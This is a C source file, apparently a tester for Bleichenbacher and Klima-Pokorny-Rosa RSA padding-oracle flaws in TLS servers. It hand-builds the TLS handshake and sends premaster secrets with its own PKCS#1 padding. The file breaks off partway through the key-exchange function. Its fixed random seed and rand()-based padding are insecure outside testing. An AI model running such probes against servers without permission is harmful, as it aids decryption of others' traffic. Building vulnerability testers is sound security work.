/* Test for Bleichenbacher and Klima-Pokorny-Rosa vulnerabilities in an
 * TLS-enabled server. 
 *
 * Built using gcc-3.2.2 and OpenSSL-0.9.7a (`gcc ssltest.c -lcrypto').
 *
 * Rather than hobble a specific version of OpenSSL, I re-implemented the
 * TLS stack from scratch. Libcrypto is still required for the primitives.
 *
 * Licensed under GPLv2.
 */

#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <assert.h>
#ifndef WIN32
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <fcntl.h>
#else
#include <winsock.h>
#endif
#include <openssl/err.h>
#include <openssl/sha.h>
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/rsa.h>
#include <openssl/x509.h>
#define OPENSSL_NO_KRB5
#include <openssl/ssl.h>

#ifndef WIN32
#define PACKED __attribute__((packed))
#define INVALID_SOCKET -1
#define SOCKET int
#else
#include <pshpack1.h>
#define PACKED
#define ushort unsigned short
#define perror print_error
#endif

//int cipher_no = 0x35;	/* RSA_AES_256_CBC_SHA */
int cipher_no = 0x4;	/* RSA_RC4_128_MD5 */

int debug = 0;
int premature_close = 0;
int connect_timeout = 0;
X509 *cert = NULL;

typedef unsigned char uchar;
typedef uchar cipher[3];

struct PACKED SSLv2_hello {
  ushort length; 		/* net-order */
  uchar msg_type; 	/* handshake */
  ushort version; 	/* net-order */
  ushort ciphers_len; 	/* in bytes, net-order */
  ushort sess_id_len; 	/* in bytes, net-order */
  ushort challenge_len; 	/* in bytes, net-order */
  
  /* ciphers */
  /* session id */
  /* challenge */
};

struct PACKED tls_record {
  uchar msg_type;
  ushort version;
  ushort length;
};

struct PACKED tls_handshake {
  uchar handshake_type;
  uchar length[3]; 	/* net-order */
};

struct PACKED tls_alert {
  uchar alert_level;
  uchar alert_details;
};

char *cert_file = "server.pem";

/* CRYPTO */

#define EXPORT40	0x1
#define EXPORT		0x2

struct cipher_suite {
  const char *tls_name;
  const char *cipher_name;
  const char *hash_name;
  int export;
} suites[] = {
  { "NULL", NULL, NULL, EXPORT },
  { "TLS_RSA_WITH_NULL_MD5", NULL, SN_md5, EXPORT },
  { "TLS_RSA_WITH_NULL_SHA", NULL, SN_sha1,  EXPORT },
  { "TLS_RSA_EXPORT_WITH_RC4_40_MD5", SN_rc4, SN_md5, EXPORT40 },
  { "TLS_RSA_WITH_RC4_128_MD5", SN_rc4, SN_md5, 0 },
  { "TLS_RSA_WITH_RC4_128_SHA", SN_rc4, SN_sha1, 0 }, 
  { "TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5", SN_rc2_cbc, SN_md5, EXPORT40 },
  { "TLS_RSA_WITH_IDEA_CBC_SHA", SN_idea_cbc, SN_sha1, 0 },
  { "TLS_RSA_EXPORT_WITH_DES40_CBC_SHA", SN_des_cbc, SN_sha1, EXPORT40 },
  { "TLS_RSA_WITH_DES_CBC_SHA", SN_des_cbc, SN_sha1, 0 },
  { "TLS_RSA_WITH_3DES_EDE_CBC_SHA", "3DES_EDE_CBC", SN_sha1, 0 },
  { "TLS_DH_DSS_EXPORT_WITH_DES40_CBC_SHA", SN_des_cbc, SN_sha1, EXPORT40 }, 
  { "TLS_DH_DSS_WITH_DES_CBC_SHA", SN_des_cbc, SN_sha1, 0 }, 
  { "TLS_DH_DSS_WITH_3DES_EDE_CBC_SHA", "3DES_EDE_CBC", SN_sha1, 0 }, 
  { "TLS_DH_RSA_EXPORT_WITH_DES40_CBC_SHA", SN_des_cbc, SN_sha1, EXPORT40 }, 
  { "TLS_DH_RSA_WITH_DES_CBC_SHA", SN_des_cbc, SN_sha1, 0 }, 

  { "TLS_DH_RSA_WITH_3DES_EDE_CBC_SHA", "3DES_EDE_CBC", SN_sha1, 0 }, 
  { "TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA", SN_des_cbc, SN_sha1, EXPORT40 }, 
  { "TLS_DHE_DSS_WITH_DES_CBC_SHA", SN_des_cbc, SN_sha1, 0 }, 
  { "TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA", "3DES_EDE_CBC", SN_sha1, 0 }, 
  { "TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA", SN_des_cbc, SN_sha1, EXPORT40 }, 
  { "TLS_DHE_RSA_WITH_DES_CBC_SHA", SN_des_cbc, SN_sha1, 0 }, 
  { "TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA", "3DES_EDE_CBC", SN_sha1, 0 }, 
  { "TLS_DH_anon_EXPORT_WITH_RC4_40_MD5", SN_rc4, SN_md5, EXPORT40 }, 
  { "TLS_DH_anon_WITH_RC4_128_MD5", SN_rc4, SN_md5, 0 }, 
  { "TLS_DH_anon_EXPORT_WITH_DES40_CBC_SHA", SN_des_cbc, SN_sha1, EXPORT40 }, 
  { "TLS_DH_anon_WITH_DES_CBC_SHA", SN_des_cbc, SN_sha1, 0 }, 
  { "TLS_DH_anon_WITH_3DES_EDE_CBC_SHA", "3DES_EDE_CBC", SN_sha1, 0 }, /* 0x1b */
  { NULL, NULL, NULL, 0 },	/* SSL FORTEZZA KEA NULL SHA */
  { NULL, NULL, NULL, 0 },	/* SSL FORTEZZA KEA FORTEZZA CBC SHA */
  { "TLS_KRB5_WITH_DES_CBC_SHA", SN_des_cbc, SN_sha1, 0 }, 
  { "TLS_KRB5_WITH_3DES_EDE_CBC_SHA", "3DES_EDE_CBC", SN_sha1, 0 }, 

  { "TLS_KRB5_WITH_RC4_128_SHA", SN_rc4, SN_sha1, 0 }, 
  { "TLS_KRB5_WITH_IDEA_CBC_SHA", SN_idea_cbc, SN_sha1, 0 }, 
  { "TLS_KRB5_WITH_DES_CBC_MD5", SN_des_cbc, SN_md5, 0 }, 
  { "TLS_KRB5_WITH_3DES_EDE_CBC_MD5", "3DES_EDE_CBC", SN_md5, 0 }, 
  { "TLS_KRB5_WITH_RC4_128_MD5", SN_rc4, SN_sha1, 0 }, 
  { "TLS_KRB5_WITH_IDEA_CBC_MD5", SN_idea_cbc, SN_md5, 0 }, 
  { "TLS_KRB5_EXPORT_WITH_DES_CBC_40_SHA", SN_des_cbc, SN_sha1, EXPORT40 }, 
  { "TLS_KRB5_EXPORT_WITH_RC2_CBC_40_SHA", SN_rc2_cbc, SN_sha1, EXPORT40 }, 
  { "TLS_KRB5_EXPORT_WITH_RC4_40_SHA", SN_rc4, SN_sha1, EXPORT40 }, 
  { "TLS_KRB5_EXPORT_WITH_DES_CBC_40_MD5", SN_des_cbc, SN_md5, EXPORT40 }, 
  { "TLS_KRB5_EXPORT_WITH_RC2_CBC_40_MD5", SN_rc2_cbc, SN_md5, EXPORT40 }, 
  { "TLS_KRB5_EXPORT_WITH_RC4_40_MD5", SN_rc4, SN_md5, EXPORT40 }, 	/* 0x2b */
  { NULL, NULL, NULL, 0 },	/* 0x2c */
  { NULL, NULL, NULL, 0 },	/* 0x2d */
  { NULL, NULL, NULL, 0 },	/* 0x2e */
  { "TLS_RSA_WITH_AES_128_CBC_SHA" , SN_aes_128_cbc, SN_sha1, 0 },

  { "TLS_DH_DSS_WITH_AES_128_CBC_SHA" , SN_aes_128_cbc, SN_sha1, 0 },
  { "TLS_DH_RSA_WITH_AES_128_CBC_SHA" , SN_aes_128_cbc, SN_sha1, 0 },
  { "TLS_DHE_DSS_WITH_AES_128_CBC_SHA" , SN_aes_128_cbc, SN_sha1, 0 },
  { "TLS_DHE_RSA_WITH_AES_128_CBC_SHA" , SN_aes_128_cbc, SN_sha1, 0 },
  { "TLS_DH_anon_WITH_AES_128_CBC_SHA" , SN_aes_128_cbc, SN_sha1, 0 },
  { "TLS_RSA_WITH_AES_256_CBC_SHA" , SN_aes_256_cbc, SN_sha1, 0 },
  { "TLS_DH_DSS_WITH_AES_256_CBC_SHA" , SN_aes_256_cbc, SN_sha1, 0 },
  { "TLS_DH_RSA_WITH_AES_256_CBC_SHA" , SN_aes_256_cbc, SN_sha1, 0 },
  { "TLS_DHE_DSS_WITH_AES_256_CBC_SHA" , SN_aes_256_cbc, SN_sha1, 0 },
  { "TLS_DHE_RSA_WITH_AES_256_CBC_SHA" , SN_aes_256_cbc, SN_sha1, 0 },
  { "TLS_DH_anon_WITH_AES_256_CBC_SHA" , SN_aes_256_cbc, SN_sha1, 0 },
  { NULL, NULL, NULL, 0 }
};

struct algorithm_suite {
  char *tls_name;
  const EVP_CIPHER *cipher;
  const EVP_MD *hash;

  struct {
    EVP_CIPHER_CTX cipher_ctx;
    unsigned char hash_secret[64];
  } client, server;
};

static void
memxor(unsigned char *out, const unsigned char *in, unsigned int len)
{
  while(len--)
    *out++ ^= *in++;
}

static void
_prf(const EVP_MD *hash_algorithm, 
     char *input, int in_len, 
     char *secret, int sec_len,
     char *output, int out_len)
{
  HMAC_CTX hash1;
  HMAC_CTX hash2;
  char A_block[64], hash_out[64];
  int A_len, hash_len;

  HMAC_CTX_init(&hash1);
  HMAC_Init_ex(&hash1, secret, sec_len, hash_algorithm, NULL);
  HMAC_Update(&hash1, input, in_len);
  HMAC_Final(&hash1, A_block, &A_len);	/* A1 = HMAC(secret,seed) */

  HMAC_CTX_init(&hash2);
  HMAC_Init_ex(&hash2, secret, sec_len, hash_algorithm, NULL);

  while(out_len > 0)
    {
      HMAC_Init_ex(&hash1, NULL, 0, NULL, NULL);
      HMAC_Update(&hash1, A_block, A_len);
      HMAC_Update(&hash1, input, in_len);
      HMAC_Final(&hash1, hash_out, &hash_len);	/* OUT = HMAC(A1,seed) */

      if (out_len > hash_len)
	{
	  memxor(output, hash_out, hash_len);
	  output += hash_len;
	  out_len -= hash_len;
	}
      else
	{
	  memxor(output, hash_out, out_len);
	  break;
	}

      HMAC_Init_ex(&hash2, NULL, 0, NULL, NULL);
      HMAC_Update(&hash2, A_block, A_len);
      HMAC_Final(&hash2, A_block, &A_len);	/* A2 = HMAC(A1) */
    }
}

static void
prf(char *input, int in_len, 
    char *secret, int sec_len, 
    unsigned char *out, int out_len)
{
  int slen = (sec_len+1)/2;

  memset(out, 0, out_len);

  _prf(EVP_get_digestbyname(SN_md5), input, in_len, secret, slen, out, out_len);

  _prf(EVP_get_digestbyname(SN_sha1), input, in_len, secret + sec_len/2, slen, 
			    out, out_len);
}

static unsigned char master_secret[48];
static unsigned char client_secret[32];
static unsigned char server_secret[32];

static int
generate_master_key(char *client_secret, char *server_secret, char *premaster,
		    int len)
{
  unsigned char buf[1024];
  
  if (premaster[0] != 0x03 || premaster[1] != 0x01) 
    {
#if 0
      fprintf(stderr, "WARNING: Pre-master data has bad version 0x%02x%02x\n",
	      premaster[0] & 0xff, premaster[1] & 0xff);
#else
      ;
#endif
    }
  
  if (debug)
    {
      int i;
      puts("pre-master secret");
      for(i=1;i<=len;i++) 
	printf("%02x%c", premaster[i-1]&0xff, (i%16) ? ' ' : '\n');
      puts("\nclient random:");
      for(i=1;i<=32;i++)
        printf("%02x%c", client_secret[i-1]&0xff, (i%16) ? ' ' : '\n');
      puts("\nserver random:");
      for(i=1;i<=32;i++)
        printf("%02x%c", server_secret[i-1]&0xff, (i%16) ? ' ' : '\n');
    }
  
  memcpy(buf, "master secret", 13); /* SSL secret secret constant */
  memcpy(&buf[13], client_secret, 32);
  memcpy(&buf[45], server_secret, 32);
  
  prf(buf, 77, premaster, len, master_secret, sizeof(master_secret));

  if (debug)
    {
      int i;
      puts("master secret");
      for(i=1;i<=48;i++) 
	printf("%02x%c", master_secret[i-1]&0xff, (i%16) ? ' ' : '\n');
    }
  
  return 0;
}

static void
generate_key_block(unsigned char *client_random, unsigned char *server_random,
		   struct cipher_suite *algorithms, struct algorithm_suite *a)
{
  unsigned char seed[256], block[1024], *bptr, *iptr;
  unsigned int block_len = 0, key_len;
  
  if (debug) 
	printf("Algorithm: %s\n", algorithms->tls_name);

  a->cipher = EVP_get_cipherbyname(algorithms->cipher_name);
  a->hash = EVP_get_digestbyname(algorithms->hash_name);

  if (algorithms->export)
    {
      key_len = 5;	/* XXX Unless 56-bit export */
    }
  else
    {
      key_len = EVP_CIPHER_key_length(a->cipher);
    }

  block_len += EVP_MD_size(a->hash) * 2;
  block_len += key_len * 2; 
  block_len += EVP_CIPHER_iv_length(a->cipher) * 2;

  strncpy(seed, "key expansion", 13);
  memcpy(&seed[13], server_random, 32);
  memcpy(&seed[45], client_random, 32);

  prf(seed, 77, master_secret, sizeof(master_secret), block, block_len);
  bptr = block;

  memcpy(a->client.hash_secret, bptr, EVP_MD_size(a->hash));
  bptr += EVP_MD_size(a->hash);

  memcpy(a->server.hash_secret, bptr, EVP_MD_size(a->hash));
  bptr += EVP_MD_size(a->hash);

  /* Remainder of block is used (in the order given) for:
   * - client decryption/encryption key.
   * - server decryption/encryption key.
   * - client IV.
   * - server IV.
   */

  iptr = bptr + key_len * 2;

  EVP_EncryptInit(&a->client.cipher_ctx, a->cipher, bptr, iptr);

  if (debug)
    {
      unsigned int z; puts("client");printf("key=");for(z=0;z<key_len; z++) printf("%02x ", bptr[z]&0xff); puts("");
      printf("iv=");for(z=0;z<(unsigned)EVP_CIPHER_iv_length(a->cipher); z++) printf("%02x ", iptr[z]&0xff); puts("");
    }

  bptr += key_len;
  iptr += EVP_CIPHER_iv_length(a->cipher);

  EVP_DecryptInit(&a->server.cipher_ctx, a->cipher, bptr, iptr);

  if (debug)
    {
      unsigned int z; puts("server");printf("key=");for(z=0;z<key_len; z++) printf("%02x ", bptr[z]&0xff); puts("");
      printf("iv=");for(z=0;z<(unsigned)EVP_CIPHER_iv_length(a->cipher); z++) printf("%02x ", iptr[z]&0xff); puts("");
    }

  if (algorithms->export)
    {
      unsigned char export_block[256], export_iv[256];
      int i = EVP_CIPHER_key_length(a->cipher);	/* 40-bit keys are
						 * expanded to 128-bits (using
						 * a predictable function)
						 * prior to being used.
						 */

      if (debug) 
	puts("EXPORT40");

      /* special rules for export ciphers. All export ciphers supported
       * are 40-it export quality only. No 56-bit export quality ciphers
       * supported.
       */

      bptr = block + EVP_MD_size(a->hash) * 2;

      memcpy(seed, "client write key", 16);
      memcpy(&seed[16], client_random, 32);
      memcpy(&seed[48], server_random, 32);

      prf(seed, 80, bptr, key_len, export_block, i);
      
      memcpy(seed, "server write key", 16);
      memcpy(&seed[16], client_random, 32);
      memcpy(&seed[48], server_random, 32);

      prf(seed, 80, bptr + key_len, key_len, export_block + i, i);
   
      memcpy(seed, "IV block", 8);
      memcpy(&seed[8], client_random, 32);
      memcpy(&seed[40], server_random, 32);

      prf(seed, 72, "", 0, export_iv, EVP_MD_size(a->hash) * 2);

      EVP_DecryptInit(&a->client.cipher_ctx, a->cipher, export_block, 
  		      export_iv);

      if (debug)
        {
          int z; puts("client");printf("key=");for(z=0;z<EVP_CIPHER_key_length(a->cipher); z++) printf("%02x ", export_block[z]&0xff); puts("");
          printf("iv=");for(z=0;z<EVP_CIPHER_iv_length(a->cipher); z++) printf("%02x ", export_iv[z]&0xff); puts("");
        }

      EVP_DecryptInit(&a->server.cipher_ctx, a->cipher, export_block + i, 
  		      export_iv + EVP_CIPHER_iv_length(a->cipher));

      if (debug)
        {
          int z; puts("server");printf("key=");for(z=0;z<EVP_CIPHER_key_length(a->cipher); z++) printf("%02x ", export_block[i+z]&0xff); puts("");
          printf("iv=");for(z=0;z<EVP_CIPHER_iv_length(a->cipher); z++) printf("%02x ", export_iv[EVP_CIPHER_iv_length(a->cipher)+z]&0xff); puts("");
        }

    }
}

static EVP_MD_CTX mesg_hash1;
static EVP_MD_CTX mesg_hash2;

void
init_mesg_hash(void)
{
  EVP_MD_CTX_init(&mesg_hash1);
  EVP_MD_CTX_init(&mesg_hash2);
  EVP_DigestInit_ex(&mesg_hash1, EVP_get_digestbyname(SN_md5), NULL);
  EVP_DigestInit_ex(&mesg_hash2, EVP_get_digestbyname(SN_sha1), NULL);
}

void
update_mesg_hash(unsigned char *buf, int len)
{
  EVP_DigestUpdate(&mesg_hash1, buf, len);
  EVP_DigestUpdate(&mesg_hash2, buf, len);
}

void
final_mesg_hash(char *constant, unsigned char *out)
{
  int len;
  EVP_MD_CTX copy1, copy2;
  unsigned char tmp[128], *p;
  
  /* Copy the CTXes: we may wish to continue adding data to the
   * hash pool, and intermittently generating a result.
   */
  
  EVP_MD_CTX_copy(&copy1, &mesg_hash1);
  EVP_MD_CTX_copy(&copy2, &mesg_hash2);
  
  strcpy(tmp, constant);
  p = tmp + strlen(constant);
  EVP_DigestFinal_ex(&copy1, p, &len);
  p += len;
  EVP_DigestFinal_ex(&copy2, p, &len);
  p += len;
  
  prf(tmp, p - tmp, master_secret, sizeof(master_secret), out, 12);
}

void
hash_message(unsigned char record_type, unsigned char *input, 
	     unsigned int input_len, unsigned char *mac_secret, 
	     const EVP_MD *hash)
{
  /* Hash value appended immediately after input[input_len-1]. */
  unsigned char sequence[8], hdr[5];
  int md_len;
  HMAC_CTX copy;
  
  /* XXX Hack: only ever the first packet */
  memset(sequence, 0, sizeof(sequence));
  
  hdr[0] = record_type;
  hdr[1] = 0x03;	
  hdr[2] = 0x01;	/* TLS version */
  hdr[3] = input_len / 256;
  hdr[4] = input_len % 256;
  
  if (debug)
    {
      unsigned int z;
      printf("sec=");
      for(z=1;z<=20;z++)
	printf("%02x ", mac_secret[z-1]&0xff);
      printf("\nseq=");
      for(z=1;z<=8;z++)
	printf("%02x ", sequence[z-1]&0xff);
      printf("\nbuf=");
      for(z=1;z<=5;z++)
	printf("%02x ", hdr[z-1]);
      printf("\nrec=");
      for(z=1;z<=input_len;z++)
	printf("%02x%c", input[z-1]&0xff, z % 16 ? ' ' : '\n');
    }
  
  HMAC_CTX_init(&copy);
  HMAC_Init_ex(&copy, mac_secret, EVP_MD_size(hash), hash, NULL);
  HMAC_Update(&copy, sequence, sizeof(sequence)); 
  HMAC_Update(&copy, hdr, 5);
  HMAC_Update(&copy, input, input_len);
  HMAC_Final(&copy, input + input_len, &md_len);

  if (debug)
    {
      int z;
      printf("final mac=");
      for(z=1;z<=md_len;z++)
	printf("%02x ", input[input_len + z - 1] & 0xff);
      puts("");
    }
}

int
encrypt_message(unsigned char *message, unsigned int mesg_len, 
		EVP_CIPHER_CTX *ctx)
{
  int extra = mesg_len % EVP_CIPHER_CTX_block_size(ctx);
  unsigned char out[1024];
  
  if (extra > 0)
    {
      /* TLS padding */
      int i;
      
      extra = EVP_CIPHER_CTX_block_size(ctx) - extra;
      
      for(i=0;i<extra;i++)
	message[mesg_len + i] = extra - 1;
      
      mesg_len += extra;
    }
  
  EVP_Cipher(ctx, out, message, mesg_len);
  memcpy(message, out, mesg_len);
  
  return (int)mesg_len;
}

/* END CRYPTO */

static int
glob_read(SOCKET ssl, char *buf, unsigned int size)
{
  int len, total = 0;
  
  while(size > 0) 
    {
#ifdef WIN32
	  len = recv(ssl, buf, size, 0);
#else
      len = read(ssl, buf, size);
#endif
      if (len <= 0)
	break;
      
      total += len;
      size -= len;
      buf += len;
    }
  
  return total;
}

static int
tls_record(SOCKET ssl, char *buf, unsigned int size, int *rec_len)
{
  struct tls_record tls;
  unsigned int length, t_len;

  t_len = glob_read(ssl, (char*)&tls, sizeof(tls));

  if (t_len == 0)
    /* end of client/server data */
    return 0;
  else if (t_len != sizeof(tls))
    /* truncated */
    return -1;
  
  if (ntohs(tls.version) != 0x0301) 
    {
      fprintf(stderr, "TLS record bad version 0x%04x!\n", ntohs(tls.version));
      return -1;
    }
  
  length = (unsigned)ntohs(tls.length) & 0xffff;
  
  if (length > size) 
    {
      fprintf(stderr, "Buffer passed to tls_record (%u bytes big) smaller than incoming tls record (%u bytes)\n", size, length);
      return -1;
    }
  
  if ((t_len = glob_read(ssl, buf, length)) != length)
    {
      fprintf(stderr, "tls record truncated!\n");
      return -1;
    }
 
  if (rec_len != NULL)
  {
	*rec_len = length;
  }

  return (int)tls.msg_type & 0xff;
}

static int
tls_handshake(SOCKET ssl, char *buf, unsigned int size, uchar *type)
{
  unsigned int tls_type, len;
  struct tls_handshake *handshake;
  char handshake_msg[4096];
  
  if ((tls_type = tls_record(ssl, handshake_msg, sizeof(handshake_msg), NULL)) <= 0) 
    {
      return -1;
    }

  if (tls_type != 22 /* HANDSHAKE */)
    {
      fprintf(stderr, "Expected handshake, got %i\n", tls_type);
      return -1;
    }
		
  handshake = (struct tls_handshake*)handshake_msg;
  
  len = (handshake->length[0] << 16) + (handshake->length[1] << 8) + handshake->length[2];
  
  if (len > size)
    {
      fprintf(stderr, "TLS handshake record (type %u) bigger than buffer passed in (%u > %u)\n", handshake->handshake_type, len, size);
      return -1;
    }

  
  memcpy(buf, &handshake[1], len);
  *type = handshake->handshake_type;
  
  update_mesg_hash((unsigned char*)handshake, sizeof(*handshake));
  update_mesg_hash(buf, len);

  return len;
}

static int
expect_handshake(SOCKET ssl, unsigned char expected_type, char *strtype,
		 char *buf, unsigned int bufsize, unsigned char *hs_type)
{
  int len = tls_handshake(ssl, buf, bufsize, hs_type);
  
  if (len < 0)
    return -1;
  
  if (*hs_type != expected_type)
    {
      fprintf(stderr, "Expected %s (%u), got %u instead\n", strtype,
	      expected_type, *hs_type);
      return -1;
    }
  
  return 0;
}

static void
hexdump(unsigned char *out, unsigned int in_len)
{
  unsigned int z, y; 
  for(y = 0; y < (in_len+15) /16; y++)
    {
      for(z = 0; z < 16; z++) 
	if (y*16 + z >= in_len)
	  printf("   ");
	else
	  printf("%02x ", out[(y*16)+z] & 0xff);
      
      printf("\t");
      
      for(z = 0; z < 16; z++) 
	if (y*16 + z >= in_len)
	  break;
	else
	  printf("%c", isprint(out[(y*16)+z]) ? out[(y*16)+z] : '.');
      
      puts("");
    }
}

#ifndef WIN32
void
sigpipe_handler(int ignored)
{
	premature_close = 1;
}
#else
void
print_error(const char *string)
{
	DWORD err = GetLastError();
	static char emsg[FORMAT_MESSAGE_MAX_WIDTH_MASK];

	if (err == NO_ERROR)
		err = WSAGetLastError();

	if (FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_MAX_WIDTH_MASK,
					  NULL, err, 0, emsg, sizeof(emsg), NULL))
	{
		fprintf(stderr, "%s:%s\n",string, emsg);
	}
	else
	{
		fprintf(stderr, "%s: error %u\n", string, err);
	}
}
#endif

int smtp_tunnel = 0;

SOCKET
ssl_connection(struct in_addr *ip, u_short port, EVP_PKEY **rsa)
{
  SOCKET sock;
  int i, cert_len, len;
  struct SSLv2_hello *hello;
  unsigned char hbuf[4096], *hptr, *cert_start, type;
  cipher *c;
  struct sockaddr_in s;

  cert = NULL;
 
  sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (sock == INVALID_SOCKET) 
    {
      perror("socket");
      return INVALID_SOCKET;
    }
  
  s.sin_family = AF_INET;
  s.sin_port = port;
  s.sin_addr.s_addr = ip->s_addr;

#ifndef WIN32
  if (connect_timeout > 0)
    {
      fd_set wfd;
      struct timeval timeout;
      int flags = fcntl(sock, F_GETFL, 0);
      fcntl(sock, F_SETFL, flags | O_NONBLOCK);

      FD_ZERO(&wfd);
      FD_SET(sock, &wfd);

      if (connect(sock, (struct sockaddr*)&s, sizeof(s)) && (errno != EINPROGRESS)) 
	{
	  perror("connect");
	  return INVALID_SOCKET;
	}

      timeout.tv_sec = connect_timeout;
      timeout.tv_usec = 0;

      if (select(sock+1, NULL, &wfd, NULL, &timeout) == 0)
	{
	  fputs("Connection timed out\n", stderr);
	  return INVALID_SOCKET;
	}

      fcntl(sock, F_SETFL, flags);
    }
  else
#endif
    if (connect(sock, (struct sockaddr*)&s, sizeof(s))) 
      {
	perror("connect");
	return INVALID_SOCKET;
      }
  
#ifndef WIN32
  if (smtp_tunnel) 
    {
      char reply[256];
      int rlen = 0;

      *reply = '\0';
      while(rlen < sizeof(reply) && 
	    strchr(reply, '\n') == NULL)
	{
	  int x;

	  if ((x = read(sock, reply, 256)) <= 0) {
	    perror("read(SMTP)");
	    close(sock);
	    return INVALID_SOCKET;
	  }

	  rlen += x;
	  reply[rlen] = '\0';
	}

      if (write(sock, "STARTTLS\r\n", 10) != 10) {
	perror("write(STARTTLS)");
	close(sock);
	return INVALID_SOCKET;
      }

      *reply = '\0';
      while(rlen < sizeof(reply) && 
	    strchr(reply, '\n') == NULL)
	{
	  int x;
	  if ((x = read(sock, reply, 256)) <= 0) {
	    perror("read(SMTP)");
	    close(sock);
	    return INVALID_SOCKET;
	  }

	  rlen += x;
	  reply[rlen] = '\0';
	}

      if (atoi(reply) != 220) {
	fputs("SMTP server does not support TLS\n", stderr);
	close(sock);
	return INVALID_SOCKET;
      }
    }
#endif

  init_mesg_hash();

  hello = (struct SSLv2_hello*)hbuf;

  hello->msg_type = 1; /* handshake */
  hello->version = htons(0x0301);
  hello->ciphers_len = htons(3);
  hello->sess_id_len = htons(0);
  hello->challenge_len = htons(16);
  
  len = sizeof(*hello) + ntohs(hello->ciphers_len) + ntohs(hello->challenge_len) + ntohs(hello->sess_id_len);
  hello->length = htons((unsigned short)((len - sizeof(hello->length)) | 0x8000));
  
  c = (cipher*)&hello[1];
  (*c)[0] = (cipher_no >> 16);
  (*c)[1] = (cipher_no >> 8) & 0xff;
  (*c)[2] = (cipher_no & 0xff);

  hptr = (unsigned char*)&c[1];
  
  srand(0xabad5eed);	/* client random */
  memset(client_secret, 0, sizeof(client_secret));
  
  for(i=0;i<ntohs(hello->challenge_len);i++)
    hptr[i] = rand() & 0xff;

  memcpy(client_secret + (sizeof(client_secret)-ntohs(hello->challenge_len)), hptr, ntohs(hello->challenge_len));

#ifdef WIN32
  if (send(sock, hbuf, len, 0) != len)
    {
      perror("write(client_hello)");
      closesocket(sock);
      return INVALID_SOCKET;
    }
#else
  if (write(sock, hbuf, len) != len)
    {
      perror("write(client_hello)");
      close(sock);
      return INVALID_SOCKET;
    }
#endif
  
  if (debug)
	  puts("hello written");
  
  update_mesg_hash(&hello->msg_type, len - sizeof(hello->length));

  if (expect_handshake(sock, 2, "Server Hello", hbuf, sizeof(hbuf), &type))
    {
#ifdef WIN32
	  closesocket(sock);
#else
      close(sock);
#endif
      return INVALID_SOCKET;
    }

  if (debug)
	  puts("client hand shaken");

  /* Pointless version check */
  
  if (ntohs(*(ushort*)hbuf) != 0x0301)
    {
      fprintf(stderr, "Bad version 0x%04x in server hello!\n",
	      *(ushort*)hbuf);
#ifdef WIN32
	  closesocket(sock);
#else
      close(sock);
#endif
      return INVALID_SOCKET;
    }

  memcpy(server_secret, hbuf + sizeof(ushort), 32);

  if (expect_handshake(sock, 11, "Server Certificate", hbuf, 
		       sizeof(hbuf), &type))
    {
#ifdef WIN32
      closesocket(sock);
#else
	  close(sock);
#endif
      return INVALID_SOCKET;
    }
  
  if (debug)
	  puts("got server certificate");

  /* decode certificate */

  hptr = hbuf + 3;	/* Skip certificate data length */
  cert_len = (hptr[0] << 16) + (hptr[1] << 8) + hptr[2];
  hptr += 3;
  cert_start = hptr;
  
  if (d2i_X509(&cert, &cert_start, cert_len) == NULL)
    {
      fputs("Bad certificate\n", stderr);
#ifdef WIN32
      closesocket(sock);
#else
	  close(sock);
#endif
      return INVALID_SOCKET;
    }

  *rsa = X509_get_pubkey(cert);

  if (*rsa == NULL)
    {
      fprintf(stderr, "X509_get_pubkey() failed with error %lu\n", 
	      ERR_get_error());
      return INVALID_SOCKET;
    }

  if (debug)
	  puts("server certificate is good");

  if (expect_handshake(sock, 14, "Server Done", hbuf, sizeof(hbuf), &type))
    {
#ifdef WIN32
      closesocket(sock);
#else
	  close(sock);
#endif
      return INVALID_SOCKET;
    }
  
  return sock;
}

int
pkcs1_padding(char *input, unsigned int input_len, char *output, EVP_PKEY *rsa)
{
	char *debug_print = output;
	int i, pad_size = BN_num_bytes(rsa->pkey.rsa->n);	/* size of modulus */

	pad_size -= input_len;

	if (pad_size < 11)	/* Minimum padding is 11 bytes */
	{
		fprintf(stderr, 
			"Can't encrypt 11 bytes of PKCS#1 padding and %u bytes\n"
			"of data in RSA key (modulus only %u bytes big)!\n", 
			input_len, pad_size + input_len);
		return -1;
	}

	*output++ = 0x00;
	*output++ = 0x02;	/* PKCS#1 padding type */

	for(i=0; i<pad_size - 3; i++)
		*output++ = rand() & 0xff;

	*output++ = 0x00;

	memcpy(output, input, input_len);

	if (debug)
	{
		unsigned int z;
		printf("premaster + PKCS1:\n");
		for(z=1; z <= input_len + pad_size; z++)
			printf("%02X%c", debug_print[z-1] & 0xff, z % 16 ? ' ' : '\n');
		puts("");
	}

	return pad_size;
}

int
send_premaster(SOCKET sock, EVP_PKEY *rsa, unsigned char *premaster, 
		unsigned int len, int pad_length)
{
  unsigned char pkt[1024], *ptr;
  struct tls_record *rec = (struct tls_record*)pkt;
  struct tls_handshake *hs = (struct tls_handshake*)&rec[1];
  int clen, i;
  struct algorithm_suite a;

  premature_close = 0;
#ifndef WIN32
  signal(SIGPIPE, sigpipe_handler);
#endif

  /* key exchange */
  
  rec->msg_type = 22; /* handshake */
  rec->version = htons(0x0301); /* TLS */
  hs->handshake_type = 16; /* client key exchange */
  
  ptr = (unsigned char*)&hs[1];

  clen = RSA_public_encrypt(len+pad_length, premaster, ptr+2, 
			    rsa->pkey.rsa, RSA_NO_PADDING);
  if (clen < 0)
    {
      fprintf(stderr, "RSA_public_encrypt() failed with error %lu\n", 
	      ERR_get_error());
      return -1;
    }

  ptr[0] = clen / 256;
  ptr[1] = clen % 256;
  
  clen += 2; /* encrypted length field */
  
  hs->length[0] = clen >> 16;
  hs->length[1] = (clen >> 8) & 0xff;
  hs->length[2] = clen & 0xff;
  
  clen += sizeof(*hs);
  update_mesg_hash((unsigned char*)hs, clen);
  rec->length = ntohs((unsigned short)clen);
  
  clen += sizeof(*rec);
#ifdef WIN32
